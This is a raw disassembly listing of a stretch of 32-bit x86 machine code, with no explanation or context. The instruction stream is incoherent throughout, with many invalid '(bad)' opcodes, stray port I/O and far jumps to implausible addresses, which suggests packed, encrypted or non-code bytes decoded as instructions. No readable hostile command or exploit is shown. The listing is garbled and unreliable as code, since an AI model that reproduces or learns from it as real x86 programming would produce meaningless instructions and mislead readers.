  41ea39:	push   ecx
  41ea3a:	push   es
  41ea3b:	jbe    0x41e9cf
  41ea3d:	scas   eax,DWORD PTR es:[edi]
  41ea3e:	and    ecx,DWORD PTR [eax]
  41ea40:	push   eax
  41ea41:	add    BYTE PTR [edi-0x6b],bl
  41ea44:	pop    edi
  41ea45:	jmp    0x41eab3
  41ea47:	dec    esp
  41ea48:	popa   
  41ea49:	add    BYTE PTR [edi+0x2806294],ah
  41ea4f:	sbb    BYTE PTR [ecx+0x1b44f4f6],al
  41ea55:	push   eax
  41ea56:	dec    BYTE PTR [eax+0x60]
  41ea59:	test   al,0x25
  41ea5b:	or     eax,0xde70738f
  41ea60:	pop    eax
  41ea61:	mov    BYTE PTR [ebp-0x2c],bh
  41ea64:	int    0x86
  41ea66:	mov    edx,ebx
  41ea68:	mov    eax,ds:0x541c29db
  41ea6d:	jb     0x41eaa3
  41ea6f:	mov    ebx,0xe4887cf8
  41ea74:	fidivr WORD PTR [edi-0x24]
  41ea77:	or     BYTE PTR [ebp-0x65f5ef0d],al
  41ea7d:	mov    esi,0xb63a506b
  41ea82:	nop
  41ea83:	test   al,0x59
  41ea85:	(bad)  
  41ea86:	mov    ebp,0xd01f9501
  41ea8b:	push   ebp
  41ea8c:	pop    edi
  41ea8d:	not    edx
  41ea8f:	test   dl,0x31
  41ea92:	call   0x203e6d8c
  41ea97:	fcom   QWORD PTR [ebx-0x3aaa5cda]
  41ea9d:	jg     0x41ea39
  41ea9f:	pop    esi
  41eaa0:	mov    ds:0x59be776,eax
  41eaa5:	lea    esp,[eax+0x0]
	...
  41eab0:	add    BYTE PTR [esi-0x3e],bh
  41eab3:	in     al,dx
  41eab4:	push   cs
  41eab5:	cld    
  41eab6:	cs (bad) 
  41eab8:	repnz lods eax,DWORD PTR ds:[esi]
  41eaba:	add    BYTE PTR [eax],bl
  41eabc:	xor    al,0x5e
  41eabe:	or     BYTE PTR [eax-0xa],ah
  41eac1:	std    
  41eac2:	add    DWORD PTR gs:[eax],eax
  41eac5:	scas   al,BYTE PTR es:[edi]
  41eac6:	add    eax,DWORD PTR [eax]
  41eac8:	add    BYTE PTR [esi],dl
  41eaca:	sar    BYTE PTR [ebx-0x519e8d92],0x32
  41ead1:	add    ebx,DWORD PTR [ebp+0x15]
  41ead4:	outs   dx,DWORD PTR ds:[esi]
  41ead5:	mov    ch,0x9
  41ead7:	pop    eax
  41ead8:	jno    0x41eb0a
  41eada:	xor    eax,0x3af4ba6e
  41eadf:	add    BYTE PTR ds:0x5b4da02b,bh
  41eae5:	ds (bad) 
  41eae7:	outs   dx,BYTE PTR gs:[esi]
  41eae9:	loope  0x41eafc
  41eaeb:	fcom   DWORD PTR [ebp+0x2b787332]
  41eaf1:	pop    ebx
  41eaf2:	aad    0x9d
  41eaf4:	push   edx
  41eaf5:	repnz push ds
  41eaf7:	push   ebx
  41eaf8:	xchg   ebp,eax
  41eaf9:	push   ecx
  41eafa:	inc    eax
  41eafb:	cmp    ebp,DWORD PTR [esi]
  41eafd:	fcomp  QWORD PTR [eax-0x6f]
  41eb00:	ficom  DWORD PTR [ebx+0x1c]
  41eb03:	or     edx,DWORD PTR [edx-0x2d9dcf21]
  41eb09:	iret   
  41eb0a:	mov    dl,0x66
  41eb0c:	mov    eax,ds:0x87ff768d
  41eb11:	neg    BYTE PTR [ecx-0x78]
  41eb14:	out    0x53,eax
  41eb16:	fmul   DWORD PTR [edi]
  41eb18:	fisubr WORD PTR [esi+0x5aac9e23]
  41eb1e:	sar    DWORD PTR [edx],cl
  41eb20:	retf   0xb621
  41eb23:	shl    DWORD PTR [eax+0x52],1
  41eb26:	sub    eax,0x5f7bda36
  41eb2b:	test   eax,0xc0a3a307
  41eb30:	mov    BYTE PTR [ebp-0x6b3d9a89],bl
  41eb36:	jns    0x41ebae
  41eb38:	xchg   esi,eax
  41eb39:	sti    
  41eb3a:	mov    ds:0xe79962d1,al
  41eb3f:	ja     0x41eb94
  41eb41:	or     esi,DWORD PTR [edi-0x3e]
  41eb44:	push   ss
  41eb45:	(bad)  
  41eb46:	bound  esp,QWORD PTR [eax]
  41eb48:	add    BYTE PTR [eax-0x6d6213a6],0x25
  41eb4f:	int    0x9e
  41eb51:	push   esp
  41eb52:	retf   0xc4f0
  41eb55:	shr    DWORD PTR [ecx-0xe],1
  41eb58:	xor    bh,BYTE PTR [edi-0x526ff83c]
  41eb5e:	and    al,0xef
  41eb60:	push   ebx
  41eb61:	push   edx
  41eb62:	inc    edx
  41eb63:	(bad)  
  41eb64:	(bad)  
  41eb65:	(bad)  
  41eb67:	push   ecx
  41eb68:	in     eax,0xdd
  41eb6a:	imul   ebx,DWORD PTR [ecx],0x2b9d2533
  41eb70:	adc    al,0x9
  41eb72:	iret   
  41eb73:	jne    0x41eb0d
  41eb75:	cdq    
  41eb76:	and    esp,DWORD PTR [ebp+0x6b]
  41eb79:	or     ebp,edx
  41eb7b:	sub    al,0xb
  41eb7d:	sbb    esp,esp
  41eb7f:	test   al,0x61
  41eb81:	test   DWORD PTR [ebx+0x6a],ebx
  41eb84:	cdq    
  41eb85:	in     al,0x6d
  41eb87:	popa   
  41eb88:	xor    edx,esi
  41eb8a:	ror    edx,0xc
  41eb8d:	or     DWORD PTR [ebx-0x1],eax
  41eb90:	das    
  41eb91:	and    eax,0x2c12e45e
  41eb96:	outs   dx,BYTE PTR ds:[esi]
  41eb97:	in     al,dx
  41eb98:	sbb    esi,DWORD PTR [ebx+0x500c94df]
  41eb9e:	sbb    eax,0xdcff6079
  41eba3:	dec    eax
  41eba4:	int3   
  41eba5:	aad    0x94
  41eba7:	inc    eax
  41eba8:	mov    ebx,0xe0bb120a
  41ebad:	hlt    
  41ebae:	push   ebp
  41ebaf:	jne    0x41eb59
  41ebb1:	add    eax,DWORD PTR [eax-0x321f5a1f]
  41ebb7:	add    al,0x33
  41ebb9:	or     al,0xf9
  41ebbb:	mov    dh,0xff
  41ebbe:	jns    0x41eb89
  41ebc0:	inc    edi
  41ebc1:	dec    edx
  41ebc2:	test   esp,ebp
  41ebc4:	fimul  WORD PTR [esi-0x7a]
  41ebc7:	dec    eax
  41ebc8:	mov    edx,0x9b6e680e
  41ebcd:	rol    DWORD PTR [eax],0x2c
  41ebd0:	mov    ds:0x3d9dcb74,al
  41ebd5:	cmc    
  41ebd6:	dec    eax
  41ebd7:	mov    ebx,0x296e8514
  41ebdc:	outs   dx,BYTE PTR ds:[esi]
  41ebdd:	fdivrp st(0),st
  41ebdf:	mov    al,ds:0xd2b7445a
  41ebe4:	ja     0x41ebea
  41ebe6:	cmp    al,0x8a
  41ebe8:	push   ss
  41ebe9:	ja     0x41eb7a
  41ebeb:	xchg   ebp,eax
  41ebec:	cli    
  41ebed:	pop    ebp
  41ebee:	sub    DWORD PTR [edi-0x2772df08],esi
  41ebf4:	in     eax,dx
  41ebf5:	mov    ah,0x49
  41ebf7:	adc    esp,DWORD PTR [ebx+0x38334b08]
  41ebfd:	vsubpd ymm5,ymm3,YMMWORD PTR [ebx+0x7499add0]
  41ec05:	or     eax,0x3e20c693
  41ec0a:	mov    ebx,0xdc0c3831
  41ec0f:	ins    BYTE PTR es:[edi],dx
  41ec10:	pop    edx
  41ec11:	call   DWORD PTR [ecx-0x7f]
  41ec14:	je     0x41ec7a
  41ec16:	and    ch,BYTE PTR [eax+edi*4+0x6620c3d4]
  41ec1d:	sahf   
  41ec1e:	xchg   edi,eax
  41ec1f:	in     eax,dx
  41ec20:	icebp  
  41ec21:	pop    es
  41ec22:	inc    esp
  41ec23:	xchg   edx,eax
  41ec24:	jp     0x41ec4d
  41ec26:	mov    dh,0x98
  41ec28:	inc    esi
  41ec29:	and    al,0x7
  41ec2b:	mov    al,0x45
  41ec2d:	jno    0x41ebdb
  41ec2f:	aas    
  41ec30:	pop    ss
  41ec31:	sbb    eax,DWORD PTR [ebx]
  41ec33:	mov    esi,ebx
  41ec35:	and    dh,BYTE PTR [ebp-0x6512efe5]
  41ec3b:	xchg   edx,eax
  41ec3c:	xchg   ebx,eax
  41ec3d:	imul   eax,DWORD PTR [edx+0x5dd4bbdd],0xf1a5b0fc
  41ec47:	loope  0x41ecbe
  41ec49:	adc    DWORD PTR [ecx-0x2f],0xfffffff1
  41ec4d:	ds add al,0x9d
  41ec50:	inc    esp
  41ec51:	adc    DWORD PTR ds:0xac859015,esi
  41ec57:	fistp  QWORD PTR [edi]
  41ec59:	call   0x1c6a739f
  41ec5e:	mov    esi,0x88bfbf9f
  41ec63:	data16 aaa 
  41ec65:	mov    WORD PTR [edx-0x3e],?
  41ec68:	mov    ebp,0x127d5565
  41ec6d:	outs   dx,DWORD PTR ds:[esi]
  41ec6e:	pop    edi
  41ec6f:	cmc    
  41ec70:	xchg   esi,eax
  41ec71:	jmp    FWORD PTR [ecx]
  41ec73:	gs add eax,esp
  41ec76:	dec    esi
  41ec77:	and    esp,DWORD PTR [ebx-0x239aa581]
  41ec7d:	js     0x41ec1f
  41ec7f:	pop    eax
  41ec80:	in     eax,dx
  41ec81:	repz in al,dx
  41ec83:	inc    ebp
  41ec84:	jns    0x41ec5d
  41ec86:	cmp    ecx,DWORD PTR [esi+ebx*1]
  41ec89:	call   0xba8:0x7762d041
  41ec90:	push   esi
  41ec91:	sub    edx,DWORD PTR [esi]
  41ec93:	xchg   esp,eax
  41ec94:	les    ecx,FWORD PTR [eax]
  41ec96:	push   0x2e
  41ec98:	mov    ecx,0x420ba7ef
  41ec9d:	or     al,0x6e
  41ec9f:	pushf  
  41eca0:	adc    bl,BYTE PTR [eax+ebx*1+0x4c34bc7c]
  41eca7:	fcom   DWORD PTR [esi+0x17bbb34f]
  41ecad:	sub    bh,BYTE PTR [eax-0x51]
  41ecb0:	(bad)  
  41ecb2:	stos   DWORD PTR es:[edi],eax
  41ecb3:	rcl    BYTE PTR [eax-0x77f67c62],0x5
  41ecba:	jnp    0x41ec4a
  41ecbc:	daa    
  41ecbd:	inc    esi
  41ecbe:	lods   eax,DWORD PTR ds:[esi]
  41ecbf:	jne    0x41eca0
  41ecc1:	clc    
  41ecc2:	adc    eax,0xfce99f0e
  41ecc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecc8:	enter  0x1d33,0xdc
  41eccc:	jecxz  0x41ed1f
  41ecce:	daa    
  41eccf:	push   ebx
  41ecd1:	dec    edi
  41ecd2:	mov    eax,ds:0xcba48e0d
  41ecd7:	dec    ebx
  41ecd8:	and    bl,BYTE PTR [ebp-0x7dd32686]
  41ecde:	je     0x41ecd4
  41ece0:	cmc    
  41ece1:	into   
  41ece2:	inc    eax
  41ece3:	fcomp  DWORD PTR [ecx-0x34]
  41ece6:	push   ecx
  41ece7:	and    dl,BYTE PTR [eax-0x6c]
  41ecea:	and    cl,BYTE PTR [eiz*8-0x5ca3b2fe]
  41ecf1:	push   esp
  41ecf2:	push   ecx
  41ecf3:	ja     0x41eccb
  41ecf5:	mov    cl,BYTE PTR [ebp-0x349964cc]
  41ecfb:	inc    ecx
  41ecfc:	rcr    DWORD PTR [eax-0x18],0xc6
  41ed00:	and    al,BYTE PTR [esi]
  41ed02:	xor    DWORD PTR [esp+eiz*4],esi
  41ed05:	neg    ah
  41ed07:	gs nop
  41ed09:	mov    edi,0xcc46f540
  41ed0e:	xor    eax,0x52d1403e
  41ed13:	jmp    0x772f:0xb87f3f28
  41ed1a:	rcr    DWORD PTR [edi],1
  41ed1c:	stos   BYTE PTR es:[edi],al
  41ed1d:	cli    
  41ed1e:	cli    
  41ed1f:	fnstsw WORD PTR [ecx]
  41ed21:	xor    al,0xa5
  41ed23:	fwait
  41ed24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed25:	adc    al,0xb2
  41ed27:	mov    BYTE PTR [ebx],cl
  41ed29:	fs int3 
  41ed2b:	repnz test ah,ch
  41ed2e:	stos   BYTE PTR es:[edi],al
  41ed2f:	mov    al,0x1b
  41ed31:	int    0x6f
  41ed33:	in     al,0xc1
  41ed35:	mov    eax,0x7e787ba
  41ed3a:	test   DWORD PTR [edx+0x31],ebp
  41ed3d:	xchg   ecx,eax
  41ed3e:	mov    bl,0x85
  41ed40:	mov    ch,0x33
  41ed42:	leave  
  41ed43:	pop    eax
  41ed44:	icebp  
  41ed45:	in     al,0x9e
  41ed47:	xor    al,0xd1
  41ed49:	mul    BYTE PTR [edx]
  41ed4b:	call   0xc2a9d0ac
  41ed50:	(bad)  
  41ed51:	mov    ds:0x63ff65fa,eax
  41ed56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed57:	jb     0x41ed04
  41ed59:	jb     0x41ed95
  41ed5b:	cmp    ebx,DWORD PTR [ecx]
  41ed5d:	fwait
  41ed5e:	stc    
  41ed5f:	jae    0x41ed3c
  41ed61:	add    al,0x5d
  41ed63:	sbb    ebx,ebp
  41ed65:	and    esp,DWORD PTR [edi+0x3b]
  41ed68:	(bad)  
  41ed6a:	daa    
  41ed6b:	inc    esi
  41ed6c:	xchg   DWORD PTR [edx+ecx*2+0x29],esp
  41ed70:	mov    ah,0x6a
  41ed72:	and    DWORD PTR [edi],0x19
  41ed75:	frstor [ebx]
  41ed77:	sti    
  41ed78:	inc    ebp
  41ed79:	inc    ecx
  41ed7a:	mov    al,ds:0xbbe990ea
  41ed7f:	mov    edi,0xccfebdee
  41ed84:	jmp    0x41ed9a
  41ed86:	out    0x56,eax
  41ed88:	dec    edx
  41ed89:	aad    0x17
  41ed8b:	xor    al,0x56
  41ed8d:	outs   dx,BYTE PTR ds:[esi]
  41ed8e:	mov    ah,0xa7
  41ed90:	fadd   DWORD PTR [esi+0x72c69227]
  41ed96:	and    DWORD PTR [ebx-0x3f],edi
  41ed99:	mov    dh,0xed
  41ed9b:	les    ebx,FWORD PTR [edx+eax*8+0x3166c2fb]
  41eda2:	into   
  41eda3:	sbb    DWORD PTR [edi+eiz*2-0x17],0xffffffbf
  41eda8:	inc    esi
  41eda9:	mov    al,0x15
  41edab:	mov    esi,0x83d6ac81
  41edb0:	test   DWORD PTR [ebp+0x5fd4b981],esp
  41edb6:	pop    esi
  41edb7:	add    BYTE PTR [edi],0x36
  41edba:	push   edi
  41edbc:	push   edi
  41edbd:	mov    BYTE PTR [edx+0x1e6652d9],bh
  41edc3:	jns    0x41edac
  41edc5:	stos   DWORD PTR es:[edi],eax
  41edc6:	inc    edi
  41edc7:	jo     0x41ed9b
  41edc9:	mov    ah,0xf9
  41edcb:	repz sbb eax,0x178c5e5
  41edd1:	leave  
  41edd2:	imul   esi,DWORD PTR [edx+ebp*8],0x7eb7dc4b
  41edd9:	ror    DWORD PTR [ebx],1
  41eddb:	add    ebp,ebx
  41eddd:	push   es
  41edde:	inc    esi
  41eddf:	sti    
  41ede0:	push   edi
  41ede1:	and    dl,BYTE PTR [eax+0x206c87d1]
  41ede7:	leave  
  41ede8:	dec    esi
  41ede9:	mov    ecx,0x6958a3f8
  41edee:	xchg   edi,eax
  41edef:	imul   ecx,DWORD PTR [ebx-0x1a],0x3f
  41edf3:	fdivr  QWORD PTR [eax]
  41edf5:	nop
  41edf6:	(bad)  
  41edf7:	rcr    DWORD PTR [ecx-0x5e],1
  41edfa:	arpl   WORD PTR [edx],bx
  41edfc:	xlat   BYTE PTR ds:[ebx]
  41edfd:	jp     0x41ee17
  41edff:	and    BYTE PTR [ecx],dl
  41ee01:	data16 fidiv DWORD PTR ds:0x2d6763a
  41ee08:	cmp    eax,DWORD PTR [esp+esi*8-0x294ee842]
  41ee0f:	dec    esp
  41ee10:	mov    ah,0x2
  41ee12:	pop    ebp
  41ee13:	addr16 cs adc al,al
  41ee17:	mov    ecx,0xab39ab50
  41ee1c:	mov    ebp,0x52f7af69
  41ee21:	test   al,0xf1
  41ee23:	mov    edi,0xef0fbd35
  41ee28:	fimul  DWORD PTR [edx+0x4]
  41ee2b:	inc    esp
  41ee2c:	loopne 0x41ee1c
  41ee2e:	call   0x4eae:0x34eba73d
  41ee35:	adc    ebx,DWORD PTR [edi]
  41ee37:	leave  
  41ee38:	leave  
  41ee39:	mov    esi,0xf0bd7b93
  41ee3e:	or     eax,0xf0777871
  41ee43:	xchg   edi,eax
  41ee44:	cmp    edi,ebx
  41ee46:	add    al,0x1d
  41ee48:	jns    0x41eeb0
  41ee4a:	pop    ecx
  41ee4b:	or     ebp,esp
  41ee4d:	sub    DWORD PTR [esi+0x791c6449],edx
  41ee53:	adc    al,0x1b
  41ee55:	jo     0x41edee
  41ee57:	test   BYTE PTR [esi-0x788ee485],dl
  41ee5d:	or     eax,eax
  41ee5f:	cmp    dh,BYTE PTR [edi]
  41ee61:	mov    ds:0x5785aeac,eax
  41ee66:	imul   edi,DWORD PTR [ebx-0x7b],0xffffffd1
  41ee6a:	fidiv  DWORD PTR [ebx+0x20]
  41ee6d:	pop    esi
  41ee6e:	dec    ecx
  41ee6f:	mov    al,ds:0x5963a653
  41ee74:	gs pushf 
  41ee76:	outs   dx,BYTE PTR ds:[esi]
	...
  41ee7f:	add    BYTE PTR [eax],al
  41ee81:	dec    esi
  41ee82:	leave  
  41ee83:	(bad)  [edi+ebx*8+0x5c]
  41ee87:	(bad)  
  41ee89:	mov    al,ds:0xbd2f76e4
  41ee8e:	repz iret 
  41ee90:	loope  0x41ee3d
  41ee92:	imul   eax,DWORD PTR [ecx],0x3ae00
  41ee98:	add    cl,al
  41ee9a:	push   ecx
  41ee9b:	sub    DWORD PTR [edi],ebp
  41ee9d:	inc    esp
  41ee9e:	xor    eax,0x35467722
  41eea3:	call   0xff02:0x7d44e9b2
  41eeaa:	push   ecx
  41eeab:	or     DWORD PTR [edx-0x3f],edi
  41eeae:	cs xchg esp,eax
  41eeb0:	arpl   WORD PTR [edi],sp
  41eeb2:	xchg   esi,eax
  41eeb3:	retf   0xb144
  41eeb6:	mov    ebx,0xdacd1f0b
  41eebb:	ds sbb dl,dh
  41eebe:	rcl    BYTE PTR es:[eax-0x69],cl
  41eec2:	add    BYTE PTR [ecx*4-0x16fdc02d],cl
  41eec9:	add    ebx,esi
  41eecb:	repnz bound esi,QWORD PTR [edi+0x33280c9d]
  41eed2:	loopne 0x41ee99
  41eed4:	sbb    eax,0x68fba5c4
  41eed9:	loopne 0x41ef08
  41eedb:	in     eax,0x90
  41eedd:	xchg   DWORD PTR [ebx],ecx
  41eedf:	jns    0x41ef0b
  41eee1:	in     eax,dx
  41eee2:	adc    eax,0x9d66817
  41eee7:	cld    
  41eee8:	(bad)  
  41eee9:	pusha  
  41eeea:	push   ecx
  41eeeb:	dec    ebp
  41eeec:	popa   
  41eeed:	add    edi,DWORD PTR [eax+eiz*2-0x76]
  41eef1:	adc    ebp,DWORD PTR [edx-0x77037986]
  41eef7:	imul   ecx,DWORD PTR [ebp+0x2c],0x721157b9
  41eefe:	inc    ebp
  41eeff:	mov    eax,DWORD PTR ds:0x839b9eb
  41ef05:	mov    esi,DWORD PTR [edi-0x3b]
  41ef08:	cmp    edi,DWORD PTR [ecx-0x5d]
  41ef0b:	fcom   DWORD PTR [edx-0x11]
  41ef0e:	sbb    BYTE PTR [esi+edi*2+0x52],al
  41ef12:	adc    DWORD PTR [ecx+0x5fb01a83],0x6dd62221
  41ef1c:	mov    ebp,0xe4734f2a
  41ef21:	(bad)  
  41ef22:	pop    ebp
  41ef23:	inc    ebx
  41ef24:	or     DWORD PTR es:[esi+0x729a1d48],ecx
  41ef2b:	mov    ecx,0x9ea89c29
  41ef30:	(bad)  
  41ef32:	xor    al,0x1d
  41ef34:	mov    al,0x82
  41ef36:	cmp    DWORD PTR [ebp-0x6b],esi
  41ef39:	jle    0x41ef84
  41ef3b:	fisttp QWORD PTR [edi+ebx*1]
  41ef3e:	outs   dx,DWORD PTR ds:[esi]
  41ef3f:	loop   0x41ef9e
  41ef41:	or     al,0x3f
  41ef43:	adc    eax,0x7c768ea2
  41ef48:	out    dx,eax
  41ef49:	mov    ds:0x458f45e1,al
  41ef4e:	xchg   esp,eax
  41ef4f:	mov    edx,0x367e632b
  41ef54:	xchg   ebp,eax
  41ef55:	mov    WORD PTR [ebp-0x50],gs
  41ef58:	or     al,0xe9
  41ef5a:	(bad)  
  41ef5b:	push   ecx
  41ef5c:	sbb    al,0x25
  41ef5e:	or     al,0x3a
  41ef60:	dec    edx
  41ef61:	adc    eax,0xd71c3f47
  41ef66:	push   edi
  41ef67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef68:	js     0x41ef16
  41ef6a:	rcl    edi,cl
  41ef6c:	adc    edx,ebp
  41ef6e:	add    bh,al
  41ef70:	scas   eax,DWORD PTR es:[edi]
  41ef71:	(bad)  
  41ef72:	ins    DWORD PTR es:[edi],dx
  41ef73:	scas   al,BYTE PTR es:[edi]
  41ef74:	leave  
  41ef75:	test   BYTE PTR [eax+esi*4+0x25586e92],0xd6
  41ef7d:	pop    edi
  41ef7e:	imul   esi,DWORD PTR [ecx],0xfffffff9
  41ef81:	idiv   DWORD PTR [edi]
  41ef83:	pop    edi
  41ef84:	inc    esi
  41ef85:	adc    BYTE PTR [ebx],bl
  41ef87:	fucomi st,st(0)
  41ef89:	xchg   DWORD PTR [esi+0x556bc127],edi
  41ef8f:	inc    BYTE PTR [eax-0x80]
  41ef92:	xor    al,0x5f
  41ef94:	add    BYTE PTR [ebx+0x25],bl
  41ef97:	sbb    DWORD PTR [esi-0x34],ebx
  41ef9a:	cld    
  41ef9b:	pop    ds
  41ef9c:	arpl   sp,di
  41ef9e:	cwde   
  41ef9f:	lahf   
  41efa0:	sbb    esi,DWORD PTR [esi+0x13]
  41efa3:	xchg   DWORD PTR [edx],edx
  41efa5:	ffree  st(6)
  41efa7:	outs   dx,DWORD PTR ds:[esi]
  41efa8:	jbe    0x41ef8f
  41efaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efab:	ins    BYTE PTR es:[edi],dx
  41efac:	ins    BYTE PTR es:[edi],dx
  41efad:	pop    ecx
  41efaf:	out    dx,eax
  41efb0:	pop    ecx
  41efb1:	sbb    eax,0x7948d9c5
  41efb6:	stos   DWORD PTR es:[edi],eax
  41efb7:	add    al,0xd0
  41efb9:	lahf   
  41efba:	jbe    0x41f02b
  41efbc:	pop    edi
  41efbd:	and    dh,bh
  41efbf:	mov    edi,0x4baa21b8
  41efc4:	repz and al,0x6
  41efc7:	inc    edi
  41efc8:	mov    edx,0xf8952802
  41efcd:	(bad)  [ecx]
  41efcf:	hlt    
  41efd0:	mov    WORD PTR [edx-0x64f3fd16],?
  41efd6:	je     0x41eff3
  41efd8:	outs   dx,DWORD PTR ds:[esi]
  41efd9:	xchg   edi,eax
  41efda:	mov    es,esi
  41efdc:	ss dec esi
  41efde:	mov    ds:0xf5e32179,eax
  41efe3:	test   eax,0x233c5b78
  41efe8:	iret   
  41efe9:	or     DWORD PTR [edx+0x17],ebp
  41efec:	pop    ecx
  41efed:	ja     0x41ef6f
  41efef:	inc    esi
  41eff0:	or     eax,0xf8a0342f
  41eff5:	sub    esi,DWORD PTR [ebx]
  41eff7:	mov    ebx,0x4762323b
  41effc:	iret   
  41effd:	jb     0x41ef92
  41efff:	data16 jae 0x41efd1
  41f002:	and    DWORD PTR [edi],esp
  41f004:	(bad)  
  41f005:	ror    BYTE PTR [ecx-0x2b82f53f],1
  41f00b:	loope  0x41f004
  41f00d:	push   di
  41f00f:	jne    0x41efb1
  41f011:	psrld  mm2,mm0
  41f014:	jmp    0x6ebd3e66
  41f019:	das    
  41f01a:	mov    dh,0x90
  41f01c:	out    0xaa,al
  41f01e:	dec    edi
  41f01f:	and    ah,0x35
  41f022:	jmp    0x41efdb
  41f024:	mov    dh,0xeb
  41f026:	add    al,0xa8
  41f028:	sub    eax,0x85f3bfb9
  41f02d:	and    eax,0x12c0a431
  41f032:	ficomp DWORD PTR [eax]
  41f034:	cmc    
  41f035:	cdq    
  41f036:	int3   
  41f037:	mov    bh,0xd0
  41f039:	cmp    BYTE PTR [ebx+ebp*1+0x5416080a],cl
  41f040:	jl     0x41f0b5
  41f042:	shr    DWORD PTR [edi+0x341ab88a],0xe
  41f049:	sti    
  41f04a:	push   edx
  41f04b:	(bad)  
  41f04c:	push   ebp
  41f04d:	mov    DWORD PTR [esi+ecx*2],ecx
  41f050:	sbb    DWORD PTR [ecx],ebp
  41f052:	jno    0x41f078
  41f054:	mov    ch,0x23
  41f056:	jle    0x41eff3
  41f058:	in     eax,dx
  41f059:	xor    al,BYTE PTR [ecx+0x29]
  41f05c:	mov    ds:0x9f8bdc5c,eax
  41f061:	call   0x5862:0xbe5ba0ff
  41f068:	cli    
  41f069:	mov    WORD PTR [ebp+ecx*4-0x14],?
  41f06d:	jecxz  0x41f09a
  41f06f:	jle    0x41f01e
  41f071:	mov    eax,ds:0x10300530
  41f076:	mov    ds:0x1e1c36e3,eax
  41f07b:	jb     0x41f0f5
  41f07d:	dec    edx
  41f07e:	cmp    DWORD PTR [ebp+0x9cdae5b],esp
  41f084:	(bad)  
  41f085:	data16 sub cl,ch
  41f088:	pop    ds
  41f089:	or     eax,0xe69dca2
  41f08e:	stc    
  41f08f:	and    al,0xc0
  41f091:	sub    al,0xcd
  41f093:	push   eax
  41f094:	sbb    dh,BYTE PTR [edi]
  41f096:	mov    al,0x5b
  41f098:	xlat   BYTE PTR ds:[ebx]
  41f099:	xor    edi,DWORD PTR [edx-0x56ea3498]
  41f09f:	out    dx,eax
  41f0a0:	and    al,0x26
  41f0a2:	mov    al,0xa6
  41f0a4:	arpl   WORD PTR [ebp+0xb],si
  41f0a7:	mov    ecx,0x1c846028
  41f0ac:	ret    0x7ba9
  41f0af:	sub    esp,DWORD PTR [esi]
  41f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0b2:	xor    ecx,eax
  41f0b4:	inc    ebp
  41f0b5:	repnz mov BYTE PTR [esp+0x6d],0x46
  41f0bb:	mov    esi,ebx
  41f0bd:	sbb    al,0xff
  41f0bf:	jmp    edx
  41f0c1:	shl    BYTE PTR [esi+0x426c0a9e],0xee
  41f0c8:	dec    esp
  41f0c9:	inc    ebx
  41f0ca:	shl    DWORD PTR [eax+0x71],cl
  41f0cd:	or     DWORD PTR [eax+0x2767fed1],ecx
  41f0d3:	fidivr DWORD PTR [ebp+0x4a]
  41f0d6:	dec    esi
  41f0d7:	push   cx
  41f0d9:	push   cs
  41f0da:	jo     0x41f13c
  41f0dc:	or     edi,DWORD PTR [ebx-0xd]
  41f0df:	xchg   DWORD PTR ds:0xf4080066,ebx
  41f0e5:	popf   
  41f0e6:	sub    edx,edx
  41f0e8:	xor    ah,bl
  41f0ea:	xlat   BYTE PTR ds:[ebx]
  41f0eb:	out    dx,eax
  41f0ec:	jne    0x41f0dc
  41f0ee:	enter  0xdc65,0x6c
  41f0f2:	inc    esp
  41f0f3:	dec    ecx
  41f0f4:	stos   DWORD PTR es:[edi],eax
  41f0f5:	mov    al,ds:0x46c6829b
  41f0fa:	ja     0x41f0b5
  41f0fc:	addr16 or eax,0xb92a20a8
  41f102:	fimul  DWORD PTR ds:0xb4b70d77
  41f108:	inc    esi
  41f109:	outs   dx,BYTE PTR ds:[esi]
  41f10a:	mov    eax,0x68652d8c
  41f10f:	add    edi,DWORD PTR [edx+0x623342c5]
  41f115:	xchg   BYTE PTR [eax],dh
  41f117:	fwait
  41f118:	push   esi
  41f119:	loop   0x41f0b6
  41f11b:	mov    edx,DWORD PTR [eax+edx*8+0x3]
  41f11f:	xchg   ebx,eax
  41f120:	sbb    al,0x3a
  41f122:	aaa    
  41f123:	aas    
  41f124:	retf   0xcc97
  41f127:	hlt    
  41f128:	mov    al,0xe0
  41f12a:	test   al,0x7
  41f12c:	(bad)  
  41f12d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f12e:	(bad)  
  41f12f:	loopne 0x41f195
  41f131:	fst    DWORD PTR [ebp-0x6058b829]
  41f137:	lods   eax,DWORD PTR ds:[esi]
  41f138:	repnz inc eax
  41f13a:	mov    ch,dl
  41f13c:	push   ecx
  41f13d:	pop    esp
  41f13e:	popf   
  41f13f:	stos   DWORD PTR es:[edi],eax
  41f140:	frstor [edi+0x46]
  41f143:	mov    ds:0xf99dcead,al
  41f148:	mov    eax,ds:0xef37a5f
  41f14d:	adc    ebx,DWORD PTR [esi+0x6d3899c8]
  41f153:	cmc    
  41f154:	or     al,0x14
  41f156:	inc    esp
  41f157:	add    esp,eax
  41f159:	sub    eax,ebp
  41f15b:	cmp    edi,DWORD PTR [esi+ecx*4]
  41f15e:	cli    
  41f15f:	push   ebx
  41f160:	adc    ah,BYTE PTR [eax]
  41f162:	mov    ah,0x80
  41f164:	mov    dl,0x51
  41f166:	lock mov eax,ds:0xf8b51f46
  41f16c:	fisub  WORD PTR ds:0xe4469dea
  41f172:	xchg   edx,eax
  41f173:	cmc    
  41f174:	pop    edx
  41f175:	mov    eax,ds:0x94e58d53
  41f17a:	xchg   edx,eax
  41f17b:	dec    ebp
  41f17c:	pop    esp
  41f17d:	add    DWORD PTR [ebx+esi*4],0x6218301
  41f184:	push   esi
  41f185:	xchg   ebx,eax
  41f186:	jge    0x41f1d9
  41f188:	push   es
  41f189:	inc    esi
  41f18a:	jo     0x41f14c
  41f18c:	data16 fwait
  41f18e:	inc    ecx
  41f18f:	xor    edx,edi
  41f191:	add    BYTE PTR [ecx+0x71],cl
  41f194:	dec    esp
  41f195:	sbb    dh,BYTE PTR [ebx+ebx*4+0x4120b17f]
  41f19c:	(bad)  [ebp+esi*4+0x49]
  41f1a0:	call   0x6b52a4b9
  41f1a5:	mov    eax,ds:0x810701a0
  41f1aa:	jmp    0x41f1c0
  41f1ac:	hlt    
  41f1ad:	call   0x446b6649
